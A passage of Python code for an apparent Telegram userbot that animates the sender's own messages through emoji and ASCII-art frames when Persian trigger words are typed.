         edits_saat = ['🕛🕛🕛🕛🕛\n🕛🕛🕛🕛🕛\n🕛🕛🕛🕛🕛\n🕛🕛🕛🕛🕛\n🕛🕛🕛🕛🕛','🕐🕐🕐🕐🕐\n🕐🕐🕐🕐🕐\n🕐🕐🕐🕐🕐\n🕐🕐🕐🕐🕐\n🕐🕐🕐🕐🕐','🕑🕑🕑🕑🕑\n🕑🕑🕑🕑🕑\n🕑🕑🕑🕑🕑\n🕑🕑🕑🕑🕑\n🕑🕑🕑🕑🕑','🕒🕒🕒🕒🕒\n🕒🕒🕒🕒🕒\n🕒🕒🕒🕒🕒\n🕒🕒🕒🕒🕒\n🕒🕒🕒🕒🕒','🕔🕔🕔🕔🕔\n🕔🕔🕔🕔🕔\n🕔🕔🕔🕔🕔\n🕔🕔🕔🕔🕔\n🕔🕔🕔🕔🕔','🕕🕕🕕🕕🕕\n🕕🕕🕕🕕🕕\n🕕🕕🕕🕕🕕\n🕕🕕🕕🕕🕕\n🕕🕕🕕🕕🕕','🕖🕖🕖🕖🕖\n🕖🕖🕖🕖🕖\n🕖🕖🕖🕖🕖\n🕖🕖🕖🕖🕖\n🕖🕖🕖🕖🕖','🕗🕗🕗🕗🕗\n🕗🕗🕗🕗🕗\n🕗🕗🕗🕗🕗\n🕗🕗🕗🕗🕗\n🕗🕗🕗🕗🕗','🕙🕙🕙🕙🕙\n🕙🕙🕙🕙🕙\n🕙🕙🕙🕙🕙\n🕙🕙🕙🕙🕙\n🕙🕙🕙🕙🕙','🕚🕚🕚🕚🕚\n🕚🕚🕚🕚🕚\n🕚🕚🕚🕚🕚\n🕚🕚🕚🕚🕚\n🕚🕚🕚🕚🕚','🕛🕛🕛🕛🕛\n🕛🕛🕛🕛🕛\n🕛🕛🕛🕛🕛\n🕛🕛🕛🕛🕛\n🕛🕛🕛🕛🕛',
        '⏰⏰⏰⏰⏰'
    ]
    try:
        for edit in edits_saat:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")


    if event.message.message in ["برگام", "پشم", "پشمام"]:
         edits_bargam = ['🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂🍂', '🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁🍁', '🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃🍃','🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿', '🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱', '☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️☘️','🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀🍀️', 'پشم دیگه ندارم ولی برگام ریخت بمولا', '🍂🍁🍂🍁🍂🍁🍂🍁🍂🍁🍂🍁🍂🍁🍂','🌱🌿🌱🌿🌱🌿🌱🌿🌱🌿🌱🌿🌱🌿🌱', '🍂🍂🌿🍂🌿🍂🌿🍂🌿🍂🌿🍂🌿🍂🌿', '☘️🍁☘️🍁☘️🍁☘️🍁☘️🍁☘️🍁☘️🍁☘️','🍂🍁🌱🌿🍂🍁🌱🌿🍂🍁🌱🌿🍂🍁🌱🌿', '🍃🍂🍁🌱🌿☘️🍀🍃🍁🍂🌿🌱☘️🍀🍃', 'دیگه برگی برام نمونده ', 'پشمام ریخ ☹'
    ]
    try:
        for edit in edits_bargam:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "رقص":
         edits_raqse = ["🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🔲🔳🔲🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥","🟥🟥🟥🟥🟥🟥🟥🔲🟥🟥🟥🟥🔳🟥🟥🟥🔲🟥🟥🟥🟥🟥🟥🟥🟥🟥","🟥🟥🟥🟥🟥🟥🟥🟥🔲🟥🟥🟥🔳🟥🟥🔲🟥🟥🟥🟥🟥🟥🟥🟥🟥","🟥🟥🟥🟥🟥🟥🔲🟥🟥🟥🟥🟥🔳🟥🟥🟥🟥🔲🟥🟥🟥🟥🟥🟥🟥","🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🔲🔳🔲🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪🟪","🟪🟪🟪🟪🟪🟪🟪🔲🟪🟪🟪🟪🔳🟪🟪🟪🔲🟪🟪🟪🟪🟪🟪🟪🟪🟪","🟪🟪🟪🟪🟪🟪🟪🟪🔲🟪🟪🟪🔳🟪🟪🔲🟪🟪🟪🟪🟪🟪🟪🟪🟪","🟪🟪🟪🟪🟪🟪🔲🟪🟪🟪🟪🟪🔳🟪🟪🟪🟪🔲🟪🟪🟪🟪🟪🟪🟪","🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🔲🔳🔲🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦","🟦🟦🟦🟦🟦🟦🟦🔲🟦🟦🟦🟦🔳🟦🟦🟦🔲🟦🟦🟦🟦🟦🟦🟦🟦🟦","🟦🟦🟦🟦🟦🟦🟦🟦🔲🟦🟦🟦🔳🟦🟦🔲🟦🟦🟦🟦🟦🟦🟦🟦🟦","🟦🟦🟦🟦🟦🟦🔲🟦🟦🟦🟦🟦🔳🟦🟦🟦🟦🔲🟦🟦🟦🟦🟦🟦🟦","◻️🟩🟩◻️◻️◻️◻️🟩◻️🟩🟩🟩🔳🟩🟩🟩◻️🟩◻️◻️◻️◻️🟩🟩◻️","🟩⬜️⬜️🟩⬜️🟩🟩⬜️🟩⬜️⬜️⬜️🔲⬜️⬜️⬜️🟩⬜️🟩🟩🟩🟩⬜️⬜️🟩","▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️▫️","🌹entire🌹"]
    try:
        for edit in edits_raqse:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "خار":
         edits_khar = ["🌵ــــــــــــــــــــــــــــــــــــــــ 🎈","🌵ــــــــــــــــــــــــــــــــــــــــ🎈","🌵ـــــــــــــــــــــــــــــــــــــــ🎈","🌵ــــــــــــــــــــــــــــــــــــــ🎈","🌵ـــــــــــــــــــــــــــــــــــــ🎈","🌵ــــــــــــــــــــــــــــــــــــ🎈","🌵ـــــــــــــــــــــــــــــــــــ🎈","🌵ــــــــــــــــــــــــــــــــــ🎈","🌵ـــــــــــــــــــــــــــــــــ🎈","🌵ــــــــــــــــــــــــــــــــ🎈","🌵ـــــــــــــــــــــــــــــــ🎈","🌵ــــــــــــــــــــــــــــــ🎈","🌵ـــــــــــــــــــــــــــــ🎈","🌵ــــــــــــــــــــــــــــ🎈","🌵ــــــــــــــــــــــــــ🎈","🌵ـــــــــــــــــــــــــ🎈","🌵ــــــــــــــــــــــ🎈","🌵ـــــــــــــــــــــ🎈","🌵ـــــــــــــــــــ🎈","🌵ـــــــــــــــــ🎈","🌵ـــــــــــــــ🎈","🌵ــــــــــــ🎈","🌵ــــــــــ🎈","🌵ـــــــــ🎈","🌵ــــــــ🎈","🌵ــــــ🎈","🌵ــــ🎈","🌵ـــ🎈","🌵ــ🎈","🌵ـ🎈","🌵💥🎈","💥Bommmm💥"]
    try:
        for edit in edits_khar:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "گلب":
         edits_galbe = ["💚💛🧡❤️","💙💚💜🖤","❤️🤍🧡💚","🖤💜💙💚","🤍🤎❤️💙","🖤💜💚💙","💝💘💗💘","❤️🤍🤎🧡","💕💞💓🤍","💜💙❤️🤍","💙💜💙💚","🧡💚🧡💙","💝💜💙❤️","💞🖤💙💚","💛🧡❤️💚","😍Im crazy about you😍"]
    try:
        for edit in edits_galbe:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "اها":
         edits_aha = [":/",":|",":(",":)",":/",":|",":(",":)"]
    try:
        for edit in edits_aha:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")


    if event.message.message == "ماشین":
         edits_mashin = ["💣________________🏎","💣_______________🏎","💣______________🏎","💣_____________🏎","💣____________🏎","💣___________🏎","💣__________🏎","💣_________🏎","💣________🏎","💣_______🏎","💣______🏎","💣____🏎","💣___🏎","💣__🏎","💣_🏎","💥BOOM💥"]
    try:
        for edit in edits_mashin:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "موتور":
         edits_motor = ["🚧___________________🛵","🚧_________________🛵","🚧_______________🛵","🚧_____________🛵","🚧___________🛵","🚧_________🛵","🚧_______🛵","🚧_____🛵","🚧____🛵","🚧__🛵","🚧_🛵","🚧🛵","وای تصادف شد","وای موتورم بـگا رف","ریدم تو موتورم","💥BOOM💥"]
    try:
        for edit in edits_motor:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "پنالتی":
         edits_penalty = [
        """
        ////////////////////
        ⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️




        😐
        👕 ⚽️
        👖
        ////////////////////
        """,
        """
        ////////////////////
        ⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️



        ⚽️
        😐
        👕
        👖
        ////////////////////
        """,
        """
        ////////////////////
        ⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️

        ⚽️


        😐
        👕
        👖
        ////////////////////
        """,
        """
        ////////////////////
        ⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⚽️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️




        😐
        👕
        👖
        ////////////////////
        """,
        """
        ////////////////////
        ⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⚽️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️
        ⬜️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬜️



        💭Gooooooooolllllllll
        😐
        👕
        👖
        ////////////////////
        """
    ]
    try:
        for edit in edits_penalty:
            await event.edit(edit)
            await asyncio.sleep(0.9)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "تانک":
         edits_tank = [".        (҂_´)\n         <,︻╦̵̵ ╤─ ҉     ~  •\n█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●",".        (҂_´)\n         <,︻╦̵̵ ╤─ ҉     ~  •\n█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●●\n▂▄▅█████████▅▄▃▂…",".        (҂_´)\n         <,︻╦̵̵ ╤─ ҉     ~  •\n█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●●●\n▂▄▅█████████▅▄▃▂…\n[███████████████████]",".        (҂_´)\n         <,︻╦̵̵ ╤─ ҉     ~  •\n█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●●●●●\n▂▄▅█████████▅▄▃▂…\n[███████████████████]\n◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙","تانک رو دیدی؟؟🤔","دیگه نمیبینی😆","💥🔥بوم💥🔥",".        (҂`_´)\n         <,︻╦̵̵ ╤─ ҉     ~  •\n█۞███████]▄▄▄▄▄▄▄▄▄▄▃ 💥●●●●●●●●●●●\n▂▄▅█████████▅▄▃▂…\n[███████████████████]\n◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙"]
    try:
        for edit in edits_tank:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "قلب2":
         edits_ghalb2 = [
        """
        ❤️❤️❤️❤️❤️❤️
        ❤️❤️❤️❤️❤️❤️
        ❤️❤️💛💛❤️❤️
        ❤️❤️💛💛❤️❤️
        ❤️❤️❤️❤️❤️❤️
        ❤️❤️❤️❤️❤️❤️
        """,
        """
        ❤️❤️❤️❤️❤️❤️
        ❤️💚💚💚💚❤️
        ❤️💚💛💛💚❤️
        ❤️💚💛💛💚❤️
        ❤️💚💚💚💚❤️
        ❤️❤️❤️❤️❤️❤️
        """,
        """
        💙💙💙💙💙💙
        💙💚💚💚💚💙
        💙💚💛💛💚💙
        💙💚💛💛💚💙
        💙💚💚💚💚💙
        💙💙💙💙💙💙
        """,
        """
        💙💙💙💙💙💙
        💙🖤🖤🖤🖤💙
        💙🖤💛💛🖤💙
        💙🖤💛💛🖤💙
        💙🖤🖤🖤🖤💙
        💙💙💙💙💙💙
        """,
        """
        💙💙💙💙💙💙
        💙🖤🖤🖤🖤💙
        💙🖤🤍🤍🖤💙
        💙🖤🤍🤍🖤💙
        💙🖤🖤🖤🖤💙
        💙💙💙💙💙💙
        """,
        """
        💔💔💔💔💔💔
        💔🖤🖤🖤🖤💔
        💔🖤🤍🤍🖤💔
        💔🖤🤍🤍🖤💔
        💔🖤🖤🖤🖤💔
        💔💔💔💔💔💔
        """,
        """
        ❤️❤️❤️❤️❤️❤️
        ❤️❤️❤️❤️❤️❤️
        ❤️❤️💛💛❤️❤️
        ❤️❤️💛💛❤️❤️
        ❤️❤️❤️❤️❤️❤️
        ❤️❤️❤️❤️❤️❤️
        """,
        """
        ❤️❤️❤️❤️❤️❤️
        ❤️💚💚💚💚❤️
        ❤️💚💛💛💚❤️
        ❤️💚💛💛💚❤️
        ❤️💚💚💚💚❤️
        ❤️❤️❤️❤️❤️❤️
        """,
        """
        💙💙💙💙💙💙
        💙💚💚💚💚💙
        💙💚💛💛💚💙
        💙💚💛💛💚💙
        💙💚💚💚💚💙
        💙💙💙💙💙💙
        """,
        """
        💙💙💙💙💙💙
        💙🖤🖤🖤🖤💙
        💙🖤💛💛🖤💙
        💙🖤💛💛🖤💙
        💙🖤🖤🖤🖤💙
        💙💙💙💙💙💙
        """,
        """
        💙💙💙💙💙💙
        💙🖤🖤🖤🖤💙
        💙🖤🤍🤍🖤💙
        💙🖤🤍🤍🖤💙
        💙🖤🖤🖤🖤💙
        💙💙💙💙💙💙
        """,
        """
        💔💔💔💔💔💔
        💔🖤🖤🖤🖤💔
        💔🖤🤍🤍🖤💔
        💔🖤🤍🤍🖤💔
        💔🖤🖤🖤🖤💔
        💔💔💔💔💔💔
        """,
        """
        🖤🖤🖤🖤
        🖤🤍🤍🖤
        🖤🤍🤍🖤
        🖤🖤🖤🖤
        """,
        "🤍",
        "❤️"
    ]
    try:
        for edit in edits_ghalb2:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "لامپ":
         edits_lamp = ["💡                 ⚡","💡                ⚡","💡               ⚡","💡              ⚡","💡             ⚡","💡            ⚡","💡           ⚡","💡          ⚡","💡         ⚡","💡        ⚡","💡       ⚡","💡      ⚡","💡     ⚡","💡    ⚡","💡   ⚡","💡  ⚡","💡 ⚡","💡⚡","💡"]
    try:
        for edit in edits_lamp:
            await event.edit(edit)
            await asyncio.sleep(0.2)
        await event.reply("با رعد و برق لامپ روشن کردیم😐، پشمای فیزیک بمولا😅")
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "شب":
         edits_shab = ["🌕","🌔","🌖","🌓","🌓","🌒","🌘","🌑"]
    try:
        for edit in edits_shab:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "بای":
         edits_bye = ["خداحافظ","Bye","Totsiens","अलविदा","Tchau","ባይ","Pa","وداعا","bless","до свидания","ցտեսություն","ka ọ dị","addio","さようなら","здраво","doei","хайр","vale","Чао","Hoşçakal","au revoir","Tschüss","баяртай","αντίο","ବିଦାୟ","o dabọ","ביי","usale kahle","د خدای په امان","farvel","Hejdå","kwaheri","再见","sala hantle","slán","sağol","خداحافظظظ"]
    try:
        for edit in edits_bye:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == 'chetory' or event.message.message == 'چطوری' or event.message.message == 'Chetory':
         edits_chetory = ["چطوریی","how are you","क्या हाल है","Bawo ni o se wa","וואס מאכסטו","jak się masz","מה שלומך","Pehea oe","څنګه یاست","તમે કેમ છો","तिमीलाई कस्तो छ ","bạn khỏe không","apa khabar","nasılsın","hoe gaat het met je","Шумо чӣ хелед","quid agis","Hur mår du","你好吗","어떻게 지내","u phela joang","Қалайсыз","お元気ですか","како си","Conas tá tú","Come stai","как поживаешь","ce mai faci","እንዴት ነህ","كيف حالك","Kedu ka ị mere","koj nyob li cas","Como você está","คุณเป็นอย่างไรบ้าง","jak się masz","Pehea oe","چطوریی"]
    try:
        for edit in edits_chetory:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "سگ":
         edits_dog = [
        "┈┈┈┈┈┈┈┈┈     ╲╱╲╱",
        "┈╲╱╲╱  ┈┈┈   ╲╲▂╲▂\n┈┈┈┈┈┈┈┈┈     ╲╱╲╱",
        "╲╲╱╱▔╱▔▔╲╲╲╲\n┈╲╱╲╱  ┈┈┈   ╲╲▂╲▂\n┈┈┈┈┈┈┈┈┈     ╲╱╲╱",
        "╱╲╱╲▏┈┈┈┈┈▕▔╰━╯\n╲╲╱╱▔╱▔▔╲╲╲╲\n┈╲╱╲╱  ┈┈┈   ╲╲▂╲▂\n┈┈┈┈┈┈┈┈┈     ╲╱╲╱",
        "┈┈╲▔▔▔▔▔╲╱┈╰┳┳┳╯\n╱╲╱╲▏┈┈┈┈┈▕▔╰━╯\n╲╲╱╱▔╱▔▔╲╲╲╲\n┈╲╱╲╱  ┈┈┈   ╲╲▂╲▂\n┈┈┈┈┈┈┈┈┈     ╲╱╲╱",
        "┈╲╲┈┈┈┈┈▏┈▏┈▔▔▔▆\n┈┈╲▔▔▔▔▔╲╱┈╰┳┳┳╯\n╱╲╱╲▏┈┈┈┈┈▕▔╰━╯\n╲╲╱╱▔╱▔▔╲╲╲╲\n┈╲╱╲╱  ┈┈┈   ╲╲▂╲▂\n┈┈┈┈┈┈┈┈┈     ╲╱╲╱",
        "┈▏▏┈┈┈┈┈▏╲▕▋▕▋▏\n┈╲╲┈┈┈┈┈▏┈▏┈▔▔▔▆\n┈┈╲▔▔▔▔▔╲╱┈╰┳┳┳╯\n╱╲╱╲▏┈┈┈┈┈▕▔╰━╯\n╲╲╱╱▔╱▔▔╲╲╲╲\n┈╲╱╲╱  ┈┈┈   ╲╲▂╲▂\n┈┈┈┈┈┈┈┈┈     ╲╱╲╱",
        "┈╱▏┈┈┈┈┈╱▔▔▔▔╲\n┈▏▏┈┈┈┈┈▏╲▕▋▕▋▏\n┈╲╲┈┈┈┈┈▏┈▏┈▔▔▔▆\n┈┈╲▔▔▔▔▔╲╱┈╰┳┳┳╯\n╱╲╱╲▏┈┈┈┈┈▕▔╰━╯\n╲╲╱╱▔╱▔▔╲╲╲╲\n┈╲╱╲╱  ┈┈┈   ╲╲▂╲▂\n┈┈┈┈┈┈┈┈┈     ╲╱╲╱"
    ]
    try:
        for edit in edits_dog:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")





    if event.message.message == "قلبز":
         edits_ghalbz = [
        ".           ❤️                  ❤️\n        ❤️  ❤️          ❤️  ❤️\n    ❤️          ❤️  ❤️          ❤️\n       ❤️           ❤️           ❤️\n           ❤️                    ❤️\n               ❤️            ❤️\n                   ❤️    ❤️\n                        ❤️\n.",
        ".           🧡                  🧡\n        🧡  🧡          🧡  🧡\n    🧡          🧡  🧡          🧡\n       🧡           🧡           🧡\n           🧡                    🧡\n               🧡            🧡\n                   🧡    🧡\n                        🧡\n.",
        ".           💛                  💛\n        💛  💛          💛  💛\n    💛          💛  💛          💛\n       💛           💛           💛\n           💛                    💛\n               💛            💛\n                   💛    💛\n                        💛\n.",
        ".           💚                  💚\n        💚  💚          💚  💚\n    💚          💚  💚          💚\n       💚           💚           💚\n           💚                    💚\n               💚            💚\n                   💚    💚\n                        💚\n.",
        ".           💙                  💙\n        💙  💙          💙  💙\n    💙          💙  💙          💙\n       💙           💙           💙\n           💙                    💙\n               💙            💙\n                   💙    💙\n                        💙\n.",
        ".           💜                  💜\n        💜  💜          💜  💜\n    💜          💜  💜          💜\n       💜           💜           💜\n           💜                    💜\n               💜            💜\n                   💜    💜\n                        💜\n.",
        ".           🖤                  🖤\n        🖤  🖤          🖤  🖤\n    🖤          🖤  🖤          🖤\n       🖤           🖤           🖤\n           🖤                    🖤\n               🖤            🖤\n                   🖤    🖤\n                        🖤\n.",
        ".           🤍                  🤍\n        🤍  🤍          🤍  🤍\n    🤍          🤍  🤍          🤍\n       🤍           🤍           🤍\n           🤍                    🤍\n               🤍            🤍\n                   🤍    🤍\n                        🤍\n.",
        ".           💗                  💗\n        💗  💗          💗  💗\n    💗          💗  💗          💗\n       💗           💗           💗\n           💗                    💗\n               💗            💗\n                   💗    💗\n                        💗\n.",
        ".           ❤️                  ❤️\n        ❤️  ❤️          ❤️  ❤️\n    ❤️          ❤️  ❤️          ❤️\n       ❤️           ❤️           ❤️\n           ❤️                    ❤️\n               ❤️            ❤️\n                   ❤️    ❤️\n                        ❤️\n.",
        ".           🧡                  🧡\n        🧡  🧡          🧡  🧡\n    🧡          🧡  🧡          🧡\n       🧡           🧡           🧡\n           🧡                    🧡\n               🧡            🧡\n                   🧡    🧡\n                        🧡\n.",
        ".           💛                  💛\n        💛  💛          💛  💛\n    💛          💛  💛          💛\n       💛           💛           💛\n           💛                    💛\n               💛            💛\n                   💛    💛\n                        💛\n.",
        ".           💚                  💚\n        💚  💚          💚  💚\n    💚          💚  💚          💚\n       💚           💚           💚\n           💚                    💚\n               💚            💚\n                   💚    💚\n                        💚\n.",
        ".           💙                  💙\n        💙  💙          💙  💙\n    💙          💙  💙          💙\n       💙           💙           💙\n           💙                    💙\n               💙            💙\n                   💙    💙\n                        💙\n.",
        ".           💜                  💜\n        💜  💜          💜  💜\n    💜          💜  💜          💜\n       💜           💜           💜\n           💜                    💜\n               💜            💜\n                   💜    💜\n.",
        ".           ❤️                  ❤️\n        ❤️  ❤️          ❤️  ❤️\n    ❤️          ❤️  ❤️          ❤️\n       ❤️           ❤️           ❤️\n           ❤️                    ❤️\n               ❤️            ❤️\n                   ❤️    ❤️\n                        ❤️\n.",
        ".           🧡                  🧡\n        🧡  🧡          🧡  🧡\n    🧡          🧡  🧡          🧡\n       🧡           🧡           🧡\n           🧡                    🧡\n               🧡            🧡\n                   🧡    🧡\n                        🧡\n.",
        ".           💛                  💛\n        💛  💛          💛  💛\n    💛          💛  💛          💛\n       💛           💛           💛\n           💛                    💛\n               💛            💛\n                   💛    💛\n                        💛\n."
    ]
    try:
        for edit in edits_ghalbz:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")


    if event.message.message == "هزارپا":
         edits_hazarpaa = ["          (█)","      ╚(██)╝\n          (█)","     ╚(███)╝\n      ╚(██)╝\n          (█)","   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)","  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)","  ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)"," ╚═(███)═╝\n  ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)","╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)"," ╚═(███)═╝\n╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)","  ╚═(███)═╝\n ╚═(███)═╝\n╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)","   ╚═(███)═╝\n  ╚═(███)═╝\n ╚═(███)═╝\n╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)","   ╚═(███)═╝\n   ╚═(███)═╝\n  ╚═(███)═╝\n ╚═(███)═╝\n╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)","  ╚═(███)═╝\n   ╚═(███)═╝\n   ╚═(███)═╝\n  ╚═(███)═╝\n ╚═(███)═╝\n╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)"," ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n   ╚═(███)═╝\n  ╚═(███)═╝\n ╚═(███)═╝\n╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)","╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n   ╚═(███)═╝\n  ╚═(███)═╝\n ╚═(███)═╝\n╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)","╚═(███)═╝\n╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n   ╚═(███)═╝\n  ╚═(███)═╝\n ╚═(███)═╝\n╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)","╚═( ͡° ͜ʖ ͡°)═╝\n\n╚═(███)═╝\n╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n   ╚═(███)═╝\n  ╚═(███)═╝\n ╚═(███)═╝\n╚═(███)═╝\n ╚═(███)═╝\n  ╚═(███)═╝\n  ╚═(███)═╝\n   ╚═(███)═╝\n     ╚(███)╝\n      ╚(██)╝\n          (█)"]
    try:
        for edit in edits_hazarpaa:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "دوست دارم":
         edits_dustdaram = ["  ▀██▀─▄███▄─▀██─██▀██▀▀█\n  ─██─███─███─██─██─██▄█","  ─██─▀██▄██▀─▀█▄█▀─██▀█\n  ▄██▄▄█▀▀▀─────▀──▄██▄▄█","  ▀██▀─▄███▄─▀██─██▀██▀▀█\n  ─██─███─███─██─██─██▄█\n  ─██─▀██▄██▀─▀█▄█▀─██▀█\n  ▄██▄▄█▀▀▀─────▀──▄██▄▄█"]
    try:
        for edit in edits_dustdaram:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")

    if event.message.message == "زنبور":
         edits_zanboor = ["🏥__________🏃‍♂️______________🐝","🏥______🏃‍♂️_______🐝","🏥______🏃‍♂️_____🐝","🏥___🏃‍♂️___🐝","🏥_🏃‍♂️_🐝","در رفت عه☹️🐝"]
    try:
        for edit in edits_zanboor:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    except Exception as e:
        print(f"Error while editing message: {e}")


    if event.message.message == "هلیکوپتر":
         edits_helikopter = [
        """
        █▬▬▬.◙.▬▬▬█
        ═▂▄▄▓▄▄▂
        ◢◤ █▀▀████▄▄▄▄◢◤
